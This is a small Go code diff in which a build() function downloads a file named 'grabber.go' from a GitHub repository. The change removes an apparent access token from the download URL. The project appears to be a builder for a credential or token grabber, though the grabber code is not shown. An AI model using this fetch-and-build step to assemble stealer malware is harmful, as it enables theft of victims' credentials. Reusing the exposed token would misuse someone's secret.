@@ -92,7 +92,7 @@ func water(text string) string {
 
 
 func build(){
-	r, err := http.Get("https://raw.githubusercontent.com/neverantia/idle/main/grabber.go?token=GHSAT0AAAAAACGM2RSPLM556T4XRRBLLQ2AZHB3MMA")
+	r, err := http.Get("https://raw.githubusercontent.com/neverantia/idle/main/grabber.go")
 
 	if err != nil{
 		fmt.Println("["+color.RedString("!")+"]"+color.RedString("Error Getting Http Response: "), err)
